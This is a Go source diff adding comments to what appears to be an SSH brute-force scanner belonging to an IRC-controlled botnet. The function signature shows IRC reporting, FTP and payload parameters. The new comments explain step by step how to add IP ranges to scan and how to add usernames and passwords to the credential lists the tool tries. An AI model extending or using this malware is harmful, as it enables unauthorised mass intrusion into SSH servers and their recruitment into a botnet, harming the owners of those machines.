@@ -10,6 +10,36 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
+/*
+<---- How to add more IP range. ---->
+
+(1) Add your new ip range in to The set of const varible.
+
+	Example:
+		var_name = "224." //224.0.0.0 - 224.255.255.255
+		or
+		var_anme = "224.12" //224.12.0.0 - 224.255.255.255
+
+(2) Go to "NextIP" function, Add The case for your ip range and return range of your ip.
+
+	Example:
+		case var_name:
+				return ManageIP_range(ipRange, GenRange(255, 0))
+		or
+		case var_name:
+				return ManageIP_range(ipRange, "")
+
+(3) Then go to The "SSH_Conn" function, And add your constant ip range to The array name "NetArr".
+
+	Example:
+		NetArr := []string{
+			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+			cgpn4, cgpn5, cgpn6, var_name,
+		}
+
+<----------------------------------->
+*/
+
 var Scan_Switch bool
 
 const (
@@ -104,6 +134,9 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 	session.Close()
 }
 
+/*
+	Add more usernames and passwords in to The array name "userList" and "passList"
+*/
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
